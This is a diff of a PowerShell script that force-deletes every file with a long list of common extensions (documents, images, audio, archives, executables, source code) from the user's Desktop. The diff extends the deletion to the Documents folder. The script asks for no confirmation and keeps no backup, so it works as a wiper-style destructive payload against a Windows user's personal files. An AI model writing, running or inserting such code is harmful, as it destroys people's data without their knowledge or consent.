@@ -1,13 +1,18 @@
 $desktopPath = [Environment]::GetFolderPath("Desktop")
+$documentsPath = [Environment]::GetFolderPath("MyDocuments")
 $extensionsToDelete = @("exe", "json", "doc", "pdf", "wpd", "docx", "rtf", "tex", "odt", "jpg", "jpeg", "mp3", "rar", "vcd", "webp", "css", "html", "py", "php", "ico", "lnk", "mp4", "js", "bak", "xml", "zip", "bmp")
 
-foreach ($extension in $extensionsToDelete) {
-    $filesToDelete = Get-ChildItem -Path $desktopPath -Filter "*.$extension" -File
+$pathsToDelete = @($desktopPath, $documentsPath)
 
-    foreach ($file in $filesToDelete) {
-        $filePath = $file.FullName
-        Write-Host "Deleting file: $filePath"
-        Remove-Item -Path $filePath -Force
+foreach ($path in $pathsToDelete) {
+    foreach ($extension in $extensionsToDelete) {
+        $filesToDelete = Get-ChildItem -Path $path -Filter "*.$extension" -File
+
+        foreach ($file in $filesToDelete) {
+            $filePath = $file.FullName
+            Write-Host "Deleting file: $filePath"
+            Remove-Item -Path $filePath -Force
+        }
     }
 }
 
